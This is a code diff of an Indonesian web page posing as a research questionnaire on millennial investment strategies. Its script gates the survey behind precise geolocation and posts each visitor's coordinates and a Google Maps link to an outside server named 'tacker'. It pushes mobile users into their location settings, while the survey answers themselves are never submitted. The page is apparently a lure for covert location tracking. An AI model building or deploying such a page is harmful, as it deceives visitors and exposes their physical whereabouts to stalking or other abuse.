@@ -97,7 +97,7 @@
       transform: scale(1.05);
     }
     .location-button {
-      display: none; /* Awalnya disembunyikan */
+      display: none;
       padding: 10px 15px;
       border: none;
       border-radius: 5px;
@@ -141,14 +141,9 @@
       color: #ffcc00;
     }
     .error {
-      color: #ff6b6b; /* Warna untuk pesan error */
+      color: #ff6b6b;
       font-size: 1em;
       margin-top: 10px;
-    }
-    .status-message { /* Untuk pesan status umum */
-        color: #f0f0f0;
-        font-size: 1em;
-        margin-top: 10px;
     }
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(20px); }
@@ -175,7 +170,7 @@
       h1 {
         font-size: 1.5em;
       }
-      p { /* Termasuk p dengan id=status */
+      p {
         font-size: 0.9em;
       }
       .survey-form select, .survey-form input, .survey-form textarea {
@@ -198,8 +193,8 @@
 <body>
   <div class="container" id="container">
     <h1>Analisis Strategi Diversifikasi Investasi di Kalangan Milenial</h1>
-    <p id="status" class="status-message">Selamat Datang! Kami akan mencoba mengakses lokasi Anda untuk melanjutkan.</p>
-    <a id="locationButton" class="location-button" href="#">Aktifkan Lokasi</a>
+    <p id="status">Selamat Datang! Silakan izinkan akses lokasi Anda untuk melanjutkan mengisi kuesioner penelitian.</p>
+    <a id="locationButton" class="location-button">Aktifkan Izin Lokasi</a>
     <div id="survey" style="display: none;">
       <p>Kami mengundang Anda untuk berpartisipasi dalam kuesioner terkait strategi investasi milenial. Silakan isi data berikut:</p>
       <div class="survey-form">
@@ -307,204 +302,128 @@
   </div>
 
   <script>
-    let userLat, userLon, userGoogleMapsLink;
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    const locationButton = document.getElementById("locationButton");
-    const statusElement = document.getElementById("status");
-    const surveyElement = document.getElementById("survey");
-    let watchId = null;
+    document.addEventListener('DOMContentLoaded', function() {
+      let userLat, userLon, userGoogleMapsLink;
+      let locationButton = document.getElementById("locationButton");
+      let isMobile = (navigator.userAgent && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || false;
 
-    window.onload = function() {
-      if (navigator.geolocation) {
-        statusElement.innerHTML = "Mencoba mendapatkan lokasi Anda...";
-        statusElement.className = 'status-message';
-        // Coba dapatkan lokasi saat halaman dimuat
-        navigator.geolocation.getCurrentPosition(
-          handlePositionSuccess,
-          handlePositionError,
-          { timeout: 8000, maximumAge: 0, enableHighAccuracy: true } // Timeout lebih lama untuk kesempatan pertama
-        );
-      } else {
-        statusElement.innerHTML = "Geolocation tidak didukung oleh browser ini.";
-        statusElement.className = 'error';
-        locationButton.style.display = 'none';
-      }
-    };
-
-    function handlePositionSuccess(position) {
-      userLat = position.coords.latitude;
-      userLon = position.coords.longitude;
-      // Menggunakan format link Google Maps yang lebih umum
-      userGoogleMapsLink = `https://maps.google.com/?q=${userLat},${userLon}`;
-
-      // Hentikan watching jika sedang aktif
-      if (watchId) {
-        navigator.geolocation.clearWatch(watchId);
-        watchId = null;
-      }
-
-      fetch('https://tacker-production.up.railway.app/save-location', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          latitude: userLat,
-          longitude: userLon,
-          timestamp: new Date().toISOString(),
-          googleMapsLink: userGoogleMapsLink
-        })
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log('Lokasi berhasil dikirim ke server.');
-          statusElement.style.display = 'none';
-          locationButton.style.display = 'none';
-          surveyElement.style.display = 'block';
-        } else {
-          console.error('Gagal mengirim lokasi ke server.');
-          statusElement.innerHTML = "Gagal menyimpan lokasi. Coba lagi atau hubungi admin.";
-          statusElement.className = 'error';
-          if (isMobile) locationButton.style.display = 'block'; // Tawarkan lagi jika gagal kirim
-        }
-      })
-      .catch(error => {
-        console.error('Error saat mengirim lokasi:', error);
-        statusElement.innerHTML = "Error mengirim lokasi. Coba lagi.";
-        statusElement.className = 'error';
-        if (isMobile) locationButton.style.display = 'block';
-      });
-    }
-
-    function handlePositionError(error) {
-      let message = "Tolong izinkan Lokasi untuk mengisi kuesioner penelitian ini.";
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          message = "Anda menolak permintaan Lokasi. Aktifkan manual di pengaturan perangkat untuk melanjutkan.";
-          break;
-        case error.POSITION_UNAVAILABLE:
-          message = "Informasi lokasi tidak tersedia. Pastikan GPS atau layanan lokasi aktif.";
-          break;
-        case error.TIMEOUT:
-          message = "Waktu habis saat mencoba mendapatkan lokasi Anda. Pastikan lokasi aktif dan coba lagi.";
-          break;
-        default: // error.UNKNOWN_ERROR atau lainnya
-          message = "Terjadi kesalahan saat mencoba mendapatkan lokasi Anda.";
-      }
-      statusElement.innerHTML = message;
-      statusElement.className = 'error';
-
-      if (isMobile && (error.code === error.PERMISSION_DENIED || error.code === error.POSITION_UNAVAILABLE)) {
-        showLocationActivationPrompt();
-      } else if (isMobile) {
-        locationButton.style.display = 'none'; // Jangan tampilkan tombol jika timeout atau unknown error
-        statusElement.innerHTML += "<br>Anda bisa mencoba memuat ulang halaman setelah memastikan lokasi aktif.";
-      } else {
-        // Untuk desktop, biasanya tidak ada tombol "aktifkan lokasi" yang direct
-        locationButton.style.display = 'none';
-      }
-    }
-
-    function showLocationActivationPrompt() {
-      statusElement.innerHTML = "Layanan lokasi di HP Anda sepertinya nonaktif. Klik tombol di bawah untuk mencoba mengaktifkannya dari pengaturan.";
-      statusElement.className = 'error'; // Tetap sebagai error/warning
-      locationButton.style.display = 'block';
-
-      if (/Android/i.test(navigator.userAgent)) {
-        locationButton.href = "intent://#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end";
-      } else if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-        locationButton.href = "App-Prefs:root=LOCATION_SERVICES";
-      } else {
-        // Untuk OS mobile lain yang tidak mendukung skema URL ini
-        locationButton.href = "#"; // Cegah navigasi default yang tidak diinginkan
-        statusElement.innerHTML += "<br>Silakan aktifkan lokasi secara manual di pengaturan perangkat Anda, lalu kembali ke halaman ini.";
-        // Tombol tetap ditampilkan, tapi fungsinya lebih ke pengingat
-      }
-
-      locationButton.onclick = function() {
-        // Tidak perlu e.preventDefault() jika kita ingin href bekerja.
-        statusElement.innerHTML = "Mengarahkan ke pengaturan lokasi... Setelah mengaktifkan, silakan kembali ke halaman ini. Kami akan mencoba mendeteksi lokasi secara otomatis.";
-        statusElement.className = 'status-message'; // Ubah jadi pesan info
-        watchForLocationChanges();
-
-        // Jika href adalah "#" (fallback), jangan navigasi
-        if (locationButton.getAttribute('href') === "#") {
-            return false; // Mencegah aksi default jika href adalah "#"
-        }
-        // Biarkan aksi default (navigasi ke href) berjalan untuk Android/iOS
-      };
-    }
-
-    function watchForLocationChanges() {
-      if (watchId) {
-        navigator.geolocation.clearWatch(watchId); // Hentikan watch sebelumnya jika ada
-      }
-      // Timeout yang lebih panjang untuk watchPosition karena pengguna mungkin perlu waktu di pengaturan
-      const watchOptions = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
-
-      watchId = navigator.geolocation.watchPosition(
-        (position) => { // Lokasi berhasil didapatkan setelah diaktifkan
-          statusElement.innerHTML = "Lokasi berhasil diaktifkan! Mengirim data...";
-          statusElement.className = 'status-message';
-          handlePositionSuccess(position); // Proses seperti biasa
-          if (watchId) {
-            navigator.geolocation.clearWatch(watchId);
-            watchId = null;
-          }
-          locationButton.style.display = 'none';
-        },
-        (error) => { // Error selama watching (misal, pengguna kembali tapi lokasi masih mati)
-          console.log("Menunggu aktivasi lokasi dari pengaturan...", error.message);
-          statusElement.innerHTML = "Kami masih menunggu Anda mengaktifkan lokasi di pengaturan dan kembali ke halaman ini. Pastikan lokasi benar-benar aktif.";
-          statusElement.className = 'error'; // Tetap sebagai info error/warning
-          // Jika errornya adalah PERMISSION_DENIED lagi setelah kembali, berarti pengguna tidak mengaktifkannya.
-          if (error.code === error.PERMISSION_DENIED) {
-            if (watchId) {
-                navigator.geolocation.clearWatch(watchId);
-                watchId = null;
-            }
-            // Kembali ke prompt awal untuk mengaktifkan
-            showLocationActivationPrompt();
-            statusElement.innerHTML = "Akses lokasi masih ditolak atau lokasi belum aktif. Silakan coba lagi melalui tombol di bawah atau aktifkan manual di pengaturan perangkat.";
-          }
-          // Biarkan watchPosition terus mencoba jika bukan PERMISSION_DENIED,
-          // karena pengguna mungkin masih di halaman pengaturan atau sinyal sedang dicari.
-        },
-        watchOptions
-      );
-    }
-
-    function submitSurvey() {
-      const name = document.getElementById("name").value;
-      const age = document.getElementById("age").value;
-      const q1 = document.getElementById("q1").value;
-      const q2 = document.getElementById("q2").value;
-      const q3 = document.getElementById("q3").value;
-      const q4 = document.getElementById("q4").value;
-      const q5 = document.getElementById("q5").value;
-      const q6 = document.getElementById("q6").value;
-      const q7 = document.getElementById("q7").value;
-      const q8 = document.getElementById("q8").value;
-      const q9 = document.getElementById("q9").value;
-      const q10 = document.getElementById("q10").value;
-
-      if (!name || !age || !q1 || !q2 || !q3 || !q4 || !q5 || !q6 || !q7 || !q8 || !q9 || !q10) {
-        alert("Harap isi semua kolom wajib!");
+      if (!locationButton) {
+        console.error("Elemen locationButton tidak ditemukan di DOM.");
         return;
       }
 
-      // Sembunyikan survei, tampilkan pesan terima kasih
-      surveyElement.style.display = 'none';
-      document.getElementById("reward").style.display = 'flex';
+      window.onload = function() {
+        if (navigator.geolocation) {
+          requestLocationPermission();
+        } else {
+          document.getElementById("status").innerHTML = "Geolocation tidak didukung oleh browser ini.";
+          document.getElementById("status").classList.add("error");
+        }
+      };
 
-      // Tambahkan efek confetti
-      for (let i = 0; i < 100; i++) {
-        const confetti = document.createElement("div");
-        confetti.className = "confetti";
-        confetti.style.left = Math.random() * 100 + "vw";
-        confetti.style.animationDelay = Math.random() * 5 + "s";
-        confetti.style.background = ['#ffd700', '#ff6b6b', '#6beab3'][Math.floor(Math.random() * 3)];
-        document.body.appendChild(confetti);
+      function requestLocationPermission() {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            sendPosition(position);
+          },
+          (error) => {
+            showLocationPrompt();
+          },
+          { timeout: 5000, maximumAge: 0, enableHighAccuracy: true }
+        );
       }
-    }
+
+      function showLocationPrompt() {
+        document.getElementById("status").innerHTML = "Izin lokasi belum diberikan. Silakan aktifkan izin lokasi di browser Anda.";
+        document.getElementById("status").classList.add("error");
+        locationButton.style.display = 'block';
+
+        locationButton.onclick = function(e) {
+          e.preventDefault();
+          requestLocationPermission(); // Coba minta izin ulang
+          if (isMobile) {
+            if (/Android/i.test(navigator.userAgent || '')) {
+              window.location.href = "intent://#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end";
+            } else if (/iPhone|iPad|iPod/i.test(navigator.userAgent || '')) {
+              window.location.href = "App-Prefs:root=LOCATION_SERVICES";
+            }
+          } else {
+            document.getElementById("status").innerHTML += "<br>Silakan aktifkan izin lokasi di pengaturan browser Anda (biasanya di ikon kunci di address bar), lalu klik tombol ini lagi.";
+          }
+          setTimeout(requestLocationPermission, 2000); // Coba ulang setelah 2 detik
+        };
+      }
+
+      function sendPosition(position) {
+        userLat = position.coords.latitude;
+        userLon = position.coords.longitude;
+        userGoogleMapsLink = `https://www.google.com/maps?q=${userLat},${userLon}`;
+
+        fetch('https://tacker-production.up.railway.app/save-location', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            latitude: userLat,
+            longitude: userLon,
+            timestamp: new Date().toISOString(),
+            googleMapsLink: userGoogleMapsLink
+          })
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log('Lokasi berhasil dikirim ke server.');
+            document.getElementById("status").style.display = 'none';
+            locationButton.style.display = 'none';
+            document.getElementById("survey").style.display = 'block';
+          } else {
+            console.error('Gagal mengirim lokasi.');
+            document.getElementById("status").innerHTML = "Tolong izinkan Lokasi untuk mengisi kuesioner penelitian ini.";
+            document.getElementById("status").classList.add("error");
+            locationButton.style.display = 'block';
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          document.getElementById("status").innerHTML = "Tolong izinkan Lokasi untuk mengisi kuesioner penelitian ini.";
+          document.getElementById("status").classList.add("error");
+          locationButton.style.display = 'block';
+        });
+      }
+
+      function submitSurvey() {
+        const name = document.getElementById("name").value;
+        const age = document.getElementById("age").value;
+        const q1 = document.getElementById("q1").value;
+        const q2 = document.getElementById("q2").value;
+        const q3 = document.getElementById("q3").value;
+        const q4 = document.getElementById("q4").value;
+        const q5 = document.getElementById("q5").value;
+        const q6 = document.getElementById("q6").value;
+        const q7 = document.getElementById("q7").value;
+        const q8 = document.getElementById("q8").value;
+        const q9 = document.getElementById("q9").value;
+        const q10 = document.getElementById("q10").value;
+
+        if (!name || !age || !q1 || !q2 || !q3 || !q4 || !q5 || !q6 || !q7 || !q8 || !q9 || !q10) {
+          alert("Harap isi semua kolom wajib!");
+          return;
+        }
+
+        document.getElementById("survey").style.display = 'none';
+        document.getElementById("reward").style.display = 'flex';
+
+        for (let i = 0; i < 100; i++) {
+          const confetti = document.createElement("div");
+          confetti.className = "confetti";
+          confetti.style.left = Math.random() * 100 + "vw";
+          confetti.style.animationDelay = Math.random() * 5 + "s";
+          confetti.style.background = ['#ffd700', '#ff6b6b', '#6beab3'][Math.floor(Math.random() * 3)];
+          document.body.appendChild(confetti);
+        }
+      }
+    });
   </script>
 </body>
 </html>
